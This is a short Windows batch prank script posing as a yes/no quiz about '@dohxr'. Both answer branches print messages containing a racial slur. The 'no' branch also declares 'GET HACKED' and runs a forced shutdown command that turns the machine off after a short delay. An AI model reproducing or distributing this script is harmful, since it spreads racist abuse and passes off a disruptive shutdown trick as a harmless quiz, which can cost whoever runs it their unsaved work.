@echo off
:1
color a 
echo Hello, is @dohxr your daddy? (answer in only yes/no)
set /p input=
if /i %input%==Yes goto love
if /i %input%==no goto hate
if /i %input%== yes,no goto 1

:love
echo KNEW IT NIGGA...
echo SEE YOU LATER 
pause 
exit

:hate
echo BUT I THOUGHT YOU WERE MY KITTEN!!!!!!..... lol
echo GET HACKED NIGGA BY DOHXR!
timeout 3
shutdown -s -t 100